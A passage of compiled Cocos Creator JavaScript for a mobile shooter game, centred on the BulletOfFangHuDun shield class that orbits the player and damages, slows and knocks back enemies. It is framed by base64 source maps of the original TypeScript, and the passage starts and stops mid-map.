QyxRQUFRLENBQUMsQ0FBQztRQUN0QyxJQUFJLFFBQVEsR0FBRyxHQUFHLENBQUMsR0FBRyxFQUFFLENBQUM7UUFDekIsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsRUFBRSxHQUFHLEVBQUUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxHQUFHLENBQUMsQ0FBQyxFQUFFLEdBQUcsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQzdFLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLFFBQVEsR0FBQyxHQUFHLENBQUM7UUFDaEMsSUFBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQ3hCLElBQUksQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxXQUFXLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDbEQsQ0FBQztJQTFGZ0IsZ0JBQWdCO1FBRHBDLE9BQU87T0FDYSxnQkFBZ0IsQ0EyRnBDO0lBQUQsdUJBQUM7Q0EzRkQsQUEyRkMsQ0EzRjZDLGdCQUFNLEdBMkZuRDtrQkEzRm9CLGdCQUFnQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQgQnVsbGV0U3RyaWtlTGlnaHRuaW5nIGZyb20gXCIuLi9idWxsZXRTdHJpa2UvQnVsbGV0U3RyaWtlTGlnaHRuaW5nXCI7XHJcbmltcG9ydCBFbmVteSBmcm9tIFwiLi4vZW5lbXkvRW5lbXlcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi8uLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldE9mTGlnaHRpbmcgZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuICAgIHByaXZhdGUgX3NrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG4gICAgcHJpdmF0ZSBfbGlnaHRFbmVteXM6QXJyYXk8RW5lbXk+ID0gW107XHJcblxyXG5cclxuICAgIG9uRGlzYWJsZSgpOiB2b2lkIHtcclxuICAgICAgICBzdXBlci5vbkRpc2FibGUoKTtcclxuICAgICAgICB0aGlzLl9saWdodEVuZW15cy5sZW5ndGggPSAwO1xyXG4gICAgfVxyXG5cclxuICAgIHN0cmlrZShvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIGxldCBnYW1lQnVsbGV0c0NvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddO1xyXG4gICAgICAgIHRoaXMuX2xpZ2h0RW5lbXlzLnB1c2gob3RoZXIuZ2V0Q29tcG9uZW50KEVuZW15KSk7XHJcbiAgICAgICAgbGV0IGJ1bGxldFN0cmlrZSA9IGdhbWVCdWxsZXRzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUJ1bGxldFN0cmlrZSgxMCk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucm90YXRpb24gPSB0aGlzLm5vZGUucm90YXRpb247XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc2V0Q29udGVudFNpemUob3RoZXIubm9kZS5nZXRDb250ZW50U2l6ZSgpKTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5zZXRQYXJlbnQob3RoZXIubm9kZSk7XHJcblxyXG4gICAgICAgIGxldCBzcHJpdGVOb2RlID0gKDxCdWxsZXRTdHJpa2VMaWdodG5pbmc+YnVsbGV0U3RyaWtlKS5zcHJpdGVOb2RlO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnJvdGF0aW9uID0gTWF0aC5yYW5kb20oKSozNjA7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKFxyXG4gICAgICAgICAgICBjYy5yZXBlYXQoXHJcbiAgICAgICAgICAgICAgICBjYy5zZXF1ZW5jZShcclxuICAgICAgICAgICAgICAgICAgICBjYy5kZWxheVRpbWUoMC4wNSksXHJcbiAgICAgICAgICAgICAgICAgICAgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3ByaXRlTm9kZS5hY3RpdmUgPSAhc3ByaXRlTm9kZS5hY3RpdmU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGJ1bGxldFN0cmlrZS5ub2RlLnJvdGF0aW9uID0gTWF0aC5yYW5kb20oKSozNjA7XHJcbiAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICksIDYpLFxyXG4gICAgICAgICAgICBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucmVtb3ZlRnJvbVBhcmVudChmYWxzZSk7XHJcbiAgICAgICAgICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5zZXRQYXJlbnQoZ2FtZUJ1bGxldHNDb250cm9sbGVyLmJ1bGxldExheWVyKTtcclxuICAgICAgICAgICAgfSkpKTtcclxuICAgIH1cclxuXHJcbiAgICBpbml0KGlkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICB0aGlzLmJ1bGxldElkID0gaWQ7XHJcbiAgICAgICAgbGV0IGNmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlByb3ApW3RoaXMuYnVsbGV0SWQtMV07XHJcbiAgICAgICAgdGhpcy5iVGhyb3VnaHQgPSBjZmdbJ3BpZXJjZSddID09PSAxO1xyXG4gICAgICAgIHRoaXMucmVwZWwgPSBjZmdbJ3JlcGVsJ107XHJcbiAgICAgICAgdGhpcy5zdGlmZiA9IGNmZ1snc3RpZmYnXTtcclxuICAgICAgICBsZXQgY29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKVswXTtcclxuICAgICAgICB0aGlzLmh1cnQgPSBNYXRoLmZsb29yKGNvbmZpZ1snaHVydCddKldvcmxkLk15LmFybW9yeS5odXJ0TXVsT2YoMSkpKmNmZ1snaHVydCddO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICBvbkxvYWQoKTogdm9pZCB7XHJcbiAgICAgICAgc3VwZXIub25Mb2FkKCk7XHJcbiAgICAgICAgdGhpcy5fc2tlID0gdGhpcy5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pO1xyXG4gICAgICAgIHRoaXMuX3NrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgbGV0IG5hbWUgPSB0cmFja0VudHJ5LmFuaW1hdGlvbiA/IHRyYWNrRW50cnkuYW5pbWF0aW9uLm5hbWUgOiAnJztcclxuICAgICAgICAgICAgLyoqIOWvu+aJvuaWsOeahOaAqueJqeaUu+WHuyAqL1xyXG4gICAgICAgICAgICAvKiog5om+5pyA6L+R55qE5oCq55Sf5oiQ6Zeq55S1ICovXHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9saWdodEVuZW15cy5sZW5ndGggPiAwICYmIHRoaXMuX2xpZ2h0RW5lbXlzLmxlbmd0aCA8IDYpe1xyXG4gICAgICAgICAgICAgICAgbGV0IGxpc3QgPSB3aW5kb3dbJ0dhbWVFbmVteXNDb250cm9sbGVyJ10uYWxsQWxpdmVBbmRJblNjcmVlbkVuZW15KCkuZmlsdGVyKHZhbHVlID0+ICF0aGlzLl9saWdodEVuZW15cy5pbmNsdWRlcyh2YWx1ZSkpO1xyXG4gICAgICAgICAgICAgICAgaWYgKGxpc3QubGVuZ3RoID4gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG1pbkRpc3RhbmNlID0gLTE7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGVuZW15ID0gbnVsbDtcclxuICAgICAgICAgICAgICAgICAgICBsaXN0LmZvckVhY2godmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGlzdGFuY2UgPSB0aGlzLm5vZGUucG9zaXRpb24uc3ViKHZhbHVlLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAobWluRGlzdGFuY2UgPCAwIHx8IGRpc3RhbmNlIDwgbWluRGlzdGFuY2Upe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbWluRGlzdGFuY2UgPSBkaXN0YW5jZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZW15ID0gdmFsdWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAvKiog55Sf5oiQ6Zeq55S1ICovXHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGJ1bGxldCA9IDxCdWxsZXRPZkxpZ2h0aW5nPndpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVQcm9wQnVsbGV0KDYpO1xyXG4gICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnBvc2l0aW9uID0gdGhpcy5fbGlnaHRFbmVteXNbdGhpcy5fbGlnaHRFbmVteXMubGVuZ3RoLTFdLm5vZGUucG9zaXRpb247XHJcbiAgICAgICAgICAgICAgICAgICAgYnVsbGV0Ll9saWdodEVuZW15cy5wdXNoKC4uLnRoaXMuX2xpZ2h0RW5lbXlzKTtcclxuICAgICAgICAgICAgICAgICAgICBidWxsZXQuam9pbnQoZW5lbXkubm9kZS5wb3NpdGlvbik7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIGpvaW50KHBvczpjYy5WZWMyKXtcclxuICAgICAgICBsZXQgc3ViID0gcG9zLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pO1xyXG4gICAgICAgIGxldCBkaXN0YW5jZSA9IHN1Yi5tYWcoKTtcclxuICAgICAgICB0aGlzLm5vZGUucm90YXRpb24gPSA5MCAtIGNjLm1pc2MucmFkaWFuc1RvRGVncmVlcyhNYXRoLmF0YW4yKHN1Yi55LCBzdWIueCkpO1xyXG4gICAgICAgIHRoaXMubm9kZS5zY2FsZVkgPSBkaXN0YW5jZS8zODA7XHJcbiAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5fc2tlLnNldEFuaW1hdGlvbigwLCBcImFuaW1hdGlvblwiLCBmYWxzZSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bullet/BulletOfFangHuDun.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'd6cb29kVNJHs4dOm8wuufsN', 'BulletOfFangHuDun');
// script/app/entities/bullet/BulletOfFangHuDun.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Bullet_1 = require("./Bullet");
var World_1 = require("../../info/World");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletOfFangHuDun = /** @class */ (function (_super) {
    __extends(BulletOfFangHuDun, _super);
    function BulletOfFangHuDun() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this._ske = null;
        return _this;
    }
    BulletOfFangHuDun.prototype.strike = function (other, self) {
        this._ske.setAnimation(0, "transition", false);
    };
    BulletOfFangHuDun.prototype.init = function (id) {
        this.bulletId = id;
        var cfg = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Prop)[this.bulletId - 1];
        this.bThrought = cfg['pierce'] === 1;
        this.repel = cfg['repel'];
        this.stiff = cfg['stiff'];
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[0];
        this.hurt = Math.floor(config['hurt'] * World_1.World.My.armory.hurtMulOf(1)) * cfg['hurt'];
    };
    BulletOfFangHuDun.prototype.onLoad = function () {
        var _this = this;
        _super.prototype.onLoad.call(this);
        this.init(5);
        this._ske = this.getComponent(sp.Skeleton);
        this._ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            // console.log("=============>completeLis..", name);
            if (name == "start" || name == "transition") {
                _this._ske.setAnimation(0, "loops", false);
                if (!_this.node.getActionByTag(114)) {
                    var speedAction = cc.speed(cc.repeatForever(cc.rotateBy(1.25, 720)), 0);
                    speedAction.setTag(114);
                    _this.node.runAction(speedAction);
                    cc.tween(speedAction)
                        .to(1, { _speed: 1 }, { easing: 'sineIn' })
                        .start();
                }
            }
        });
        window['GameRoleController'].role.node.on(cc.Node.EventType.POSITION_CHANGED, function () {
            _this.node.position = window['GameRoleController'].role.node.position;
        });
    };
    BulletOfFangHuDun.prototype.blink = function () {
        this.unblink();
        var action = cc.repeatForever(cc.sequence(cc.fadeTo(0.1, 0), cc.fadeTo(0.1, 255)));
        action.setTag(485);
        this.node.runAction(action);
    };
    BulletOfFangHuDun.prototype.unblink = function () {
        this.node.stopActionByTag(485);
        this.node.opacity = 255;
    };
    BulletOfFangHuDun.prototype.onDisable = function () {
        this.unblink();
        _super.prototype.onDisable.call(this);
        window['GameRoleController'].role.spaceCircleCollider.radius = 25;
    };
    BulletOfFangHuDun.prototype.onEnable = function () {
        _super.prototype.onEnable.call(this);
        window['GameRoleController'].role.spaceCircleCollider.radius = 80;
        this.node.position = window['GameRoleController'].role.node.position;
        this.node.stopAllActions();
        this._ske.setAnimation(0, "start", false);
    };
    /*update(dt:number){
        if (GameProxy.pauseGame)return;
        if (this.node.color.getR() < 255){
            this.node.color.setR(this.node.color.getR() + 1);
        }
        if (this.node.color.getG() < 255){
            this.node.color.setG(this.node.color.getG() + 1);
        }
        if (this.node.color.getB() < 255){
            this.node.color.setB(this.node.color.getB() + 1);
        }
        this._impenetrableDefenceCD -= dt;
        if (this._impenetrableDefenceCD <= 0){
            this.node.active = false;
        }
    }*/
    BulletOfFangHuDun.prototype.onCollisionStay = function (other, self) {
        this.strike(other, self);
    };
    BulletOfFangHuDun.prototype.collisionEnemy = function (other, self) {
        this.strike(other, self);
        var enemy = other.getComponent('Enemy');
        /** 僵硬 */
        if (this.stiff > 0) {
            enemy.doStiff(this.stiff);
        }
        /** 减速 */
        enemy.doSpeedcut();
        /** 击退效果 */
        this.doRepeal(enemy, this.repel);
        /** 飘血效果 */
        var damage = this.hurt;
        if (damage > 0) {
            enemy.hp -= damage;
        }
    };
    BulletOfFangHuDun.prototype.doRepeal = function (enemy, repel) {
        enemy.doRepel(enemy.node.position.sub(this.node.position).normalize(), repel);
    };
    BulletOfFangHuDun = __decorate([
        ccclass
    ], BulletOfFangHuDun);
    return BulletOfFangHuDun;
}(Bullet_1.default));
exports.default = BulletOfFangHuDun;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkZhbmdIdUR1bi50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsbUNBQThCO0FBQzlCLDBDQUF1QztBQUN2Qyx3RUFBcUU7QUFDckUsZ0VBQTZEO0FBRXZELElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQStDLHFDQUFNO0lBQXJEO1FBQUEscUVBa0hDO1FBaEhXLFVBQUksR0FBZSxJQUFJLENBQUM7O0lBZ0hwQyxDQUFDO0lBN0dHLGtDQUFNLEdBQU4sVUFBTyxLQUFLLEVBQUUsSUFBSTtRQUNkLElBQUksQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLENBQUMsRUFBRSxZQUFZLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDbkQsQ0FBQztJQUVELGdDQUFJLEdBQUosVUFBSyxFQUFVO1FBQ1gsSUFBSSxDQUFDLFFBQVEsR0FBRyxFQUFFLENBQUM7UUFDbkIsSUFBSSxHQUFHLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxJQUFJLENBQUMsQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFDLENBQUMsQ0FBQyxDQUFDO1FBQzNFLElBQUksQ0FBQyxTQUFTLEdBQUcsR0FBRyxDQUFDLFFBQVEsQ0FBQyxLQUFLLENBQUMsQ0FBQztRQUNyQyxJQUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUMxQixJQUFJLENBQUMsS0FBSyxHQUFHLEdBQUcsQ0FBQyxPQUFPLENBQUMsQ0FBQztRQUMxQixJQUFJLE1BQU0sR0FBRyx5QkFBVyxDQUFDLGFBQWEsQ0FBQyxpQ0FBZSxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ2xFLElBQUksQ0FBQyxJQUFJLEdBQUcsSUFBSSxDQUFDLEtBQUssQ0FBQyxNQUFNLENBQUMs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LElBQUksQ0FBQyxJQUFJLENBQUM7UUFDdkIsSUFBSSxNQUFNLEdBQUcsQ0FBQyxFQUFDO1lBQ1gsS0FBSyxDQUFDLEVBQUUsSUFBSSxNQUFNLENBQUM7U0FDdEI7SUFDTCxDQUFDO0lBRUQsb0NBQVEsR0FBUixVQUFTLEtBQUssRUFBRSxLQUFLO1FBQ2pCLEtBQUssQ0FBQyxPQUFPLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLENBQUMsU0FBUyxFQUFFLEVBQUUsS0FBSyxDQUFDLENBQUM7SUFDbEYsQ0FBQztJQWpIZ0IsaUJBQWlCO1FBRHJDLE9BQU87T0FDYSxpQkFBaUIsQ0FrSHJDO0lBQUQsd0JBQUM7Q0FsSEQsQUFrSEMsQ0FsSDhDLGdCQUFNLEdBa0hwRDtrQkFsSG9CLGlCQUFpQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQnVsbGV0IGZyb20gXCIuL0J1bGxldFwiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0T2ZGYW5nSHVEdW4gZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuICAgIHByaXZhdGUgX3NrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG5cclxuICAgIHN0cmlrZShvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIHRoaXMuX3NrZS5zZXRBbmltYXRpb24oMCwgXCJ0cmFuc2l0aW9uXCIsIGZhbHNlKTtcclxuICAgIH1cclxuXHJcbiAgICBpbml0KGlkOiBudW1iZXIpOiB2b2lkIHtcclxuICAgICAgICB0aGlzLmJ1bGxldElkID0gaWQ7XHJcbiAgICAgICAgbGV0IGNmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLlByb3ApW3RoaXMuYnVsbGV0SWQtMV07XHJcbiAgICAgICAgdGhpcy5iVGhyb3VnaHQgPSBjZmdbJ3BpZXJjZSddID09PSAxO1xyXG4gICAgICAgIHRoaXMucmVwZWwgPSBjZmdbJ3JlcGVsJ107XHJcbiAgICAgICAgdGhpcy5zdG